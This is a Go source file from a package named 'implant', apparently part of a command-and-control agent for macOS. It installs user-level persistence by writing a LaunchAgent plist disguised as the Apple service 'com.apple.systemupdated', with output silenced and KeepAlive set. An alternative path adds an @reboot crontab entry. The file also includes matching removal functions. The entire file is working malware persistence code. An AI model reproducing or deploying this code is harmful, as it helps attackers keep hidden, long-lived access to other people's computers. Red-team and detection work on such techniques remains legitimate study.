//go:build darwin

package implant

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
)

// installLaunchAgent installs a LaunchAgent plist for user-level persistence.
// LaunchAgents run on login without admin privileges.
func installLaunchAgent(label, execPath string) error {
	usr, err := user.Current()
	if err != nil {
		return err
	}

	launchAgentDir := filepath.Join(usr.HomeDir, "Library", "LaunchAgents")
	if err := os.MkdirAll(launchAgentDir, 0755); err != nil {
		return err
	}

	plistPath := filepath.Join(launchAgentDir, label+".plist")

	plist := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
`, label, execPath)

	return os.WriteFile(plistPath, []byte(plist), 0644)
}

// removeLaunchAgent removes a LaunchAgent plist.
func removeLaunchAgent(label string) error {
	usr, err := user.Current()
	if err != nil {
		return err
	}
	plistPath := filepath.Join(usr.HomeDir, "Library", "LaunchAgents", label+".plist")
	return os.Remove(plistPath)
}

// InstallPersistenceDarwin installs macOS persistence mechanisms.
// method: "launchagent" (default), "cron"
func InstallPersistenceDarwin(method, execPath string) ([]byte, error) {
	if execPath == "" {
		execPath, _ = os.Executable()
	}
	label := "com.apple.systemupdated"

	switch method {
	case "cron":
		cmd := fmt.Sprintf(`(crontab -l 2>/dev/null; echo "@reboot %s") | crontab -`, execPath)
		out, err := ExecuteShell([]string{cmd})
		if err != nil {
			return nil, err
		}
		return []byte("[+] Cron persistence installed\n" + string(out)), nil
	default: // launchagent
		if err := installLaunchAgent(label, execPath); err != nil {
			return nil, err
		}
		// Load immediately
		ExecuteShell([]string{fmt.Sprintf("launchctl load %s/Library/LaunchAgents/%s.plist", os.Getenv("HOME"), label)})
		return []byte(fmt.Sprintf("[+] LaunchAgent installed: ~/Library/LaunchAgents/%s.plist", label)), nil
	}
}

// RemovePersistenceDarwin removes macOS persistence.
func RemovePersistenceDarwin() ([]byte, error) {
	label := "com.apple.systemupdated"
	usr, _ := user.Current()
	plistPath := filepath.Join(usr.HomeDir, "Library", "LaunchAgents", label+".plist")
	ExecuteShell([]string{"launchctl unload " + plistPath})
	if err := removeLaunchAgent(label); err != nil {
		return []byte("[-] LaunchAgent not found"), nil
	}
	return []byte("[+] LaunchAgent removed"), nil
}
